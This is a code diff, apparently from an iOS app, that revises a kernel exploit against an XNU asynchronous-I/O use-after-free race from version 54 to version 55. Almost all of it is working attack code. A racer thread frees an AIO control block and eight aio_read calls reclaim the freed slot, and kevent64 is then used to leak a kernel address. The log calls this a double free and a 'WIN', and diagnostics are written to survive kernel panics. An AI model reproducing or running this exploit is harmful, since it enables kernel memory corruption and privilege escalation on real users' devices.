@@ -247,22 +247,33 @@ struct aio_race_state {
     ssize_t return_result;  // v47: aio_return result or aio_read errno (diagnostics)
 };
 
-// v54: Flood workq with 30 AIO reads BEFORE reclaim. rcb goes to TAIL of workq,
-// worker is busy with flood entries → kevent64 has time to fire BEFORE worker
-// reaches rcb and frees it. Diag written to Documents (persists across reboot).
-struct v54_state {
+// v55: Match crazymind90 original exploit — racer thread started BEFORE lio_listio,
+// 8 reclaim entries, wait for all to complete, then kevent64 with 10s timeout.
+// Key: knote activated by KNOTE() during reclaim I/O completion (entry ALIVE),
+// kevent64 just dequeues pre-activated event — no filt_aioprocess on freed entry.
+
+#define V55_NRECLAIM 8
+
+struct v55_race_state {
+    atomic_bool start, stop;
+    atomic_int freed;
+    atomic_bool reclaim_done;
+    struct aiocb *trigger;
+    struct aiocb *rcbs;
+    int nrcbs;
+};
+
+struct v55_state {
     int fd;
     int kq;
     struct kevent64_s kev;
     int nev;
     int err;
-    int aio_read_rc;
-    int aio_read_errno;
-    int rcb_err;
+    int freed;           // did racer win?
+    int reclaimed;       // did reclaim succeed?
     int kevent_called;
     int kq_leaked;
-    int flood_count;      // number of flood entries successfully submitted
-    char diag_path[512];  // Documents path (persists across reboot)
+    char diag_path[512];
 };
 
 // v19: E2 racer state — aio_return frees E2's slot, OOL spray reclaims it.
@@ -283,11 +294,32 @@ static void aio_set_thread_affinity(int tag) {
                       (thread_policy_t)&pol, THREAD_AFFINITY_POLICY_COUNT);
 }
 
-// v54: Flood workq BEFORE reclaim — 30 AIO reads at unique offsets push rcb
-// to TAIL of workq. Worker must process all 30 flood entries before rcb,
-// giving kevent64 ~60us+ window. Diag written to Documents/ (reboot-safe).
-static void *v54_exploit_thread(void *arg) {
-    struct v54_state *st = (struct v54_state *)arg;
+// v55 racer: free trigger entry, then immediately reclaim on same CPU.
+// Same-CPU LIFO ensures first aio_read gets the just-freed slot.
+static void *v55_racer(void *arg) {
+    struct v55_race_state *s = (struct v55_race_state *)arg;
+    aio_set_thread_affinity(42);
+
+    while (!atomic_load_explicit(&s->start, memory_order_acquire));
+
+    while (!atomic_load_explicit(&s->stop, memory_order_relaxed)) {
+        if (aio_error(s->trigger) == 0) {
+            ssize_t r = aio_return(s->trigger);
+            if (r >= 0) {
+                atomic_fetch_add(&s->freed, 1);
+                for (int i = 0; i < s->nrcbs; i++)
+                    aio_read(&s->rcbs[i]);
+                atomic_store_explicit(&s->reclaim_done, true, memory_order_release);
+                return NULL;
+            }
+        }
+    }
+    return NULL;
+}
+
+// v55: Match original exploit — single kq, racer before lio_listio, 8 reclaims.
+static void *v55_exploit_thread(void *arg) {
+    struct v55_state *st = (struct v55_state *)arg;
     aio_set_thread_affinity(42);
 
     int kq = kqueue();
@@ -295,23 +327,7 @@ static void *v54_exploit_thread(void *arg) {
     st->kq = kq;
     int fd = st->fd;
 
-    // ---- FLOOD: 30 x 1KB AIO reads to fill workq ahead of rcb ----
-    struct aiocb fb[30];
-    char fbuf[30][1024];
-    int nflood = 0;
-    for (int i = 0; i < 30; i++) {
-        memset(&fb[i], 0, sizeof(fb[i]));
-        fb[i].aio_fildes = fd;
-        fb[i].aio_buf = fbuf[i];
-        fb[i].aio_nbytes = sizeof(fbuf[i]);
-        fb[i].aio_offset = (128ULL * 1024 * 1024) + (i * 4096);
-        fb[i].aio_lio_opcode = LIO_READ;
-        fb[i].aio_sigevent.sigev_notify = SIGEV_NONE;
-        if (aio_read(&fb[i]) == 0) nflood++;
-    }
-    st->flood_count = nflood;
-
-    // tcb: 4KB at offset 0, SIGEV_KEVENT → knote on kq
+    // tcb: trigger AIO with SIGEV_KEVENT
     struct aiocb tcb;
     char tbuf[4096];
     memset(&tcb, 0, sizeof(tcb));
@@ -323,56 +339,86 @@ static void *v54_exploit_thread(void *arg) {
     tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
     tcb.aio_sigevent.sigev_signo = kq;
 
-    // rcb: 8KB at offset 128MB, SIGEV_NONE — reclaims tcb's slot via LIFO
-    struct aiocb rcb;
-    char rbuf[8192];
-    memset(&rcb, 0, sizeof(rcb));
-    rcb.aio_fildes = fd;
-    rcb.aio_buf = rbuf;
-    rcb.aio_nbytes = sizeof(rbuf);
-    rcb.aio_offset = 128ULL * 1024 * 1024;
-    rcb.aio_lio_opcode = LIO_READ;
-    rcb.aio_sigevent.sigev_notify = SIGEV_NONE;
+    // Pre-configure 8 reclaim entries
+    struct aiocb rcbs[V55_NRECLAIM];
+    char rbufs[V55_NRECLAIM][4096];
+    for (int i = 0; i < V55_NRECLAIM; i++) {
+        memset(&rcbs[i], 0, sizeof(rcbs[i]));
+        rcbs[i].aio_fildes = fd;
+        rcbs[i].aio_buf = rbufs[i];
+        rcbs[i].aio_nbytes = sizeof(rbufs[i]);
+        rcbs[i].aio_offset = 0;
+        rcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
+    }
 
-    // Submit tcb I/O
+    // Start racer BEFORE lio_listio
+    struct v55_race_state rs = {};
+    rs.trigger = &tcb;
+    rs.rcbs = rcbs;
+    rs.nrcbs = V55_NRECLAIM;
+
+    pthread_t thr;
+    pthread_create(&thr, NULL, v55_racer, &rs);
+    atomic_store_explicit(&rs.start, true, memory_order_release);
+
+    // Submit trigger via lio_listio — race window is between
+    // aio_try_enqueue_work_locked() and aio_register_kevent()
     struct aiocb *ptr = &tcb;
     struct sigevent sig = {};
     sig.sigev_notify = SIGEV_NONE;
     lio_listio(LIO_NOWAIT, &ptr, 1, &sig);
 
-    // Wait for tcb I/O completion
-    while (aio_error(&tcb) == EINPROGRESS) {}
+    usleep(500);
+    atomic_store_explicit(&rs.stop, true, memory_order_release);
+    pthread_join(thr, NULL);
 
-    // Free tcb → slot S on CPU 42 magazine
-    aio_return(&tcb);
+    int freed = atomic_load(&rs.freed);
+    bool reclaimed = atomic_load(&rs.reclaim_done);
+    st->freed = freed;
+    st->reclaimed = reclaimed ? V55_NRECLAIM : 0;
 
-    // Reclaim slot S with rcb — rcb at TAIL of workq (behind nflood entries)
-    int rc = aio_read(&rcb);
-    st->aio_read_rc = rc;
-    st->aio_read_errno = (rc < 0) ? errno : 0;
-
-    st->rcb_err = aio_error(&rcb);
-
-    // Write diagnostic to Documents (persists across reboot)
+    // Write diagnostic to Documents
     if (st->diag_path[0] != '\0') {
         int dfd = open(st->diag_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
         if (dfd >= 0) {
             char dbuf[512];
             int dlen = snprintf(dbuf, sizeof(dbuf),
-                "aio_read_rc=%d errno=%d rcb_err=%d floods=%d\n",
-                rc, st->aio_read_errno, st->rcb_err, nflood);
+                "freed=%d reclaimed=%d\n", freed, reclaimed ? 1 : 0);
             write(dfd, dbuf, dlen);
             fsync(dfd);
             close(dfd);
         }
     }
 
-    if (st->rcb_err == EINPROGRESS) {
-        st->nev = kevent64(kq, NULL, 0, &st->kev, 1, 0, NULL);
-        st->kevent_called = 1;
-    } else {
-        st->nev = -2;
-        st->kevent_called = 0;
+    if (freed == 0) {
+        // Race lost — clean up safely
+        while (aio_error(&tcb) == EINPROGRESS) usleep(500);
+        aio_return(&tcb);
+        st->kq_leaked = 1;
+        return NULL;
+    }
+
+    if (!reclaimed) {
+        st->kq_leaked = 1;
+        return NULL;
+    }
+
+    // Wait for ALL reclaim entries to complete.
+    // During rcbs[0]'s I/O completion, worker calls KNOTE() on the LIVE entry
+    // → event activated and queued in kq. kevent64 will just dequeue it.
+    for (int i = 0; i < V55_NRECLAIM; i++)
+        while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);
+
+    // kevent64 with 10s timeout — dequeues pre-activated event.
+    // No filt_aioprocess on freed entry (event was cached when entry was alive).
+    struct timespec ts = {10, 0};
+    st->nev = kevent64(kq, NULL, 0, &st->kev, 1, 0, &ts);
+    st->kevent_called = 1;
+
+    // Clean up reclaim entries
+    for (int i = 0; i < V55_NRECLAIM; i++) {
+        if (aio_error(&rcbs[i]) != EINVAL)
+            aio_return(&rcbs[i]);
     }
 
     return NULL;
@@ -5830,7 +5876,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO UAF v54 (Workq Flood) =========="];
+    [self appendLog:@"\n========== AIO UAF v55 (Match Original Racer) =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5839,64 +5885,58 @@ static void *e2_free_and_ool_racer(void *arg) {
     });
 
     // Run exploit on background thread so UI stays responsive.
-    // appendLog dispatches UI updates to main thread internally.
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         @autoreleasepool {
 
-    // v54: Diagnostic file in Documents (persists across kernel panic / reboot)
+    // v55: Diagnostic in Documents (persists across kernel panic / reboot)
     NSString *docsDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
-    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v54.txt"];
+    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v55.txt"];
     unlink(diagPath.UTF8String);
 
+    // v55: Small 4KB file (matching original). No F_NOCACHE needed.
     NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_uaf.bin"];
     int fd = open(path.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
     if (fd < 0) {
         [self appendLog:@"FAIL: could not create temp file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO UAF v54" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO UAF v55" forState:UIControlStateNormal];
         });
         return;
     }
-    // v54: FLOOD workq with 30 AIO reads BEFORE reclaim.
-    // rcb goes to TAIL of workq → worker must process all 30 flood entries
-    // before reaching rcb → kevent64 has ~60us+ to fire and read the knote.
-    // v52/v53 proved: entry dies before kevent64 can fire when rcb at HEAD.
-    fcntl(fd, F_NOCACHE, 1);
     {
-        const size_t fsize = 256 * 1024 * 1024;  // 256MB
-        char chunk[262144];  // 256KB
-        memset(chunk, 'B', sizeof(chunk));
-        for (size_t written = 0; written < fsize; written += sizeof(chunk)) {
-            write(fd, chunk, sizeof(chunk));
-        }
+        char fdata[4096];
+        memset(fdata, 'A', sizeof(fdata));
+        write(fd, fdata, sizeof(fdata));
     }
-    [self appendLog:[NSString stringWithFormat:@"fd=%d file=256MB F_NOCACHE pid=%d uid=%d", fd, getpid(), getuid()]];
+    [self appendLog:[NSString stringWithFormat:@"fd=%d file=4KB pid=%d uid=%d", fd, getpid(), getuid()]];
     [self appendLog:[NSString stringWithFormat:@"diag=%@", diagPath]];
 
-    // v54: Flood workq BEFORE reclaim gives kevent64 time to win the race.
-    // 30 flood entries × ~2us each ≈ 60us window for kevent64 to read knote.
+    // v55: Racer started BEFORE lio_listio, 8 reclaim entries,
+    // wait for all to complete, then kevent64 with 10s timeout.
+    // knote is activated by KNOTE() during reclaim I/O completion
+    // (entry still ALIVE) → kevent64 just dequeues cached event.
 
     uint64_t entryAddr = 0;
 
-    // ---- Phase A v54: workq flood + kevent64 ----
-    [self appendLog:@"\n--- Phase A v54: 30-flood workq + kevent64 ---"];
+    // ---- Phase A v55: racer before lio_listio + 8 reclaims ----
+    [self appendLog:@"\n--- Phase A v55: racer before lio_listio + 8 reclaims ---"];
 
     bool phaseA_won = false;
-    for (int attempt = 0; attempt < 5; attempt++) {
-        [self appendLog:[NSString stringWithFormat:@"  attempt %d/5", attempt + 1]];
+    for (int attempt = 0; attempt < 10; attempt++) {
+        [self appendLog:[NSString stringWithFormat:@"  attempt %d/10", attempt + 1]];
 
-        struct v54_state st = {};
+        struct v55_state st = {};
         st.fd = fd;
         st.kq = -1;
         st.nev = -1;
         strncpy(st.diag_path, diagPath.UTF8String, sizeof(st.diag_path) - 1);
 
         pthread_t thr;
-        pthread_create(&thr, NULL, v54_exploit_thread, &st);
+        pthread_create(&thr, NULL, v55_exploit_thread, &st);
         pthread_join(thr, NULL);
 
-        // Read diagnostic file (fsync'd before kevent64 — survives kernel panic)
+        // Read diagnostic file (fsync'd before kevent64)
         NSString *diagStr = [NSString stringWithContentsOfFile:diagPath encoding:NSUTF8StringEncoding error:nil];
         if (diagStr) {
             diagStr = [diagStr stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
@@ -5910,27 +5950,29 @@ static void *e2_free_and_ool_racer(void *arg) {
             continue;
         }
 
-        [self appendLog:[NSString stringWithFormat:@"  aio_read rc=%d errno=%d floods=%d",
-            st.aio_read_rc, st.aio_read_errno, st.flood_count]];
-        [self appendLog:[NSString stringWithFormat:@"  rcb_err=%d(%s) kevent_called=%d",
-            st.rcb_err,
-            st.rcb_err == EINPROGRESS ? "INPROGRESS" : (st.rcb_err == 0 ? "DONE" : "ERR"),
-            st.kevent_called]];
+        [self appendLog:[NSString stringWithFormat:@"  freed=%d reclaimed=%d",
+            st.freed, st.reclaimed]];
 
-        if (!st.kevent_called) {
-            [self appendLog:[NSString stringWithFormat:@"  kevent64 SKIPPED (entry dead, rcb_err=%d)",
-                st.rcb_err]];
-            // LEAK kq — close(kq) on stale knote → EAGAIN on retry (v52 bug).
-            st.kq_leaked = 1;
+        if (st.freed == 0) {
+            [self appendLog:@"  race LOST (worker won) — retry"];
+            if (!st.kq_leaked) close(st.kq);
             continue;
         }
 
-        int kq = st.kq;
+        if (!st.reclaimed) {
+            [self appendLog:@"  freed but no reclaim — retry"];
+            if (!st.kq_leaked) close(st.kq);
+            continue;
+        }
+
+        [self appendLog:[NSString stringWithFormat:@"  kevent_called=%d nev=%d",
+            st.kevent_called, st.nev]];
+
         int nev = st.nev;
         struct kevent64_s kev = st.kev;
 
-        [self appendLog:[NSString stringWithFormat:@"  kevent64(timeout=0)=%d", nev]];
         if (nev > 0) {
+            [self appendLog:[NSString stringWithFormat:@"  *** DOUBLE-FREE ACHIEVED ***"]];
             [self appendLog:[NSString stringWithFormat:@"  kev.ident=0x%llx filter=%hd flags=0x%x fflags=0x%x",
                 kev.ident, kev.filter, kev.flags, kev.fflags]];
             [self appendLog:[NSString stringWithFormat:@"  kev.data=0x%llx udata=0x%llx ext[0]=0x%llx ext[1]=0x%llx",
@@ -5938,33 +5980,24 @@ static void *e2_free_and_ool_racer(void *arg) {
             if (kev.ident != 0) {
                 entryAddr = kev.ident;
             }
-            // Knope consumed — close is safe
-            close(kq);
+            close(st.kq);
             phaseA_won = true;
             break;
-        } else if (nev == 0) {
-            [self appendLog:@"  kevent64 returned 0 events — LEAK kq"];
-            st.kq_leaked = 1;
         } else {
-            [self appendLog:[NSString stringWithFormat:@"  kevent64 error: %d — LEAK kq", nev]];
-            st.kq_leaked = 1;
+            [self appendLog:[NSString stringWithFormat:@"  kevent64 timeout/error: %d", nev]];
+            close(st.kq);
         }
     }
 
     if (!phaseA_won) {
-        [self appendLog:@"FAIL: Phase A could not read knote after 5 attempts"];
-        goto cleanup;
-    }
-
-    if (entryAddr == 0) {
-        [self appendLog:@"FAIL: kev.ident=0 — aborting"];
+        [self appendLog:@"FAIL: could not trigger double-free after 10 attempts"];
         goto cleanup;
     }
 
     [self appendLog:[NSString stringWithFormat:@"\nWIN: entryAddr=0x%llx", entryAddr]];
 
-    // ---- Phase C v54: Health check ----
-    [self appendLog:@"\n--- Phase C v54: Health check ---"];
+    // ---- Phase C v55: Health check ----
+    [self appendLog:@"\n--- Phase C v55: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -5990,11 +6023,11 @@ cleanup:
     close(fd);
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO UAF v54 Complete =========="];
+    [self appendLog:@"========== AIO UAF v55 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO UAF v54" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO UAF v55" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
